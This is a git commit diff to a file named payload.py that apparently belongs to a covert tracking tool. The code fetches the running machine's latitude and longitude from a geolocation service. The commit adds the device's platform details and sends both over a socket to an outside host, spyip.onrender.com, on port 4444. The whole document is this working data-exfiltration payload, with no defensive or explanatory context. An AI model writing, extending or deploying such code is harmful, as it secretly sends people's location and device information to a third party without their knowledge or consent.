de840674cd80afe34a360d6e032b9f142c2400a2
Zr0zr8 <162935805+Zr0zr8@users.noreply.github.com>
2024-07-07 04:42:30 +0300

    Update payload.py

--- payload.py
+++ payload.py
@@ -1,24 +1,27 @@
 import socket
 import requests
 import time
+import platform
 
 def get_location():
     try:
         response = requests.get('http://ip-api.com/json/')
         data = response.json()
         return data['lat'], data['lon']
-    except:
+    except Exception as e:
+        print(f"Error getting location: {e}")
         return None, None
 
 def send_location():
-    host = 'https://spyip.onrender.com'
+    host = 'spyip.onrender.com'
     port = 4444
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((host, port))
 
     lat, lon = get_location()
+    device_info = platform.platform()
     if lat and lon:
-        location = f"Location: {lat}, {lon}"
+        location = f"Location: {lat}, {lon}, Device: {device_info}"
         s.send(location.encode())
     s.close()
 
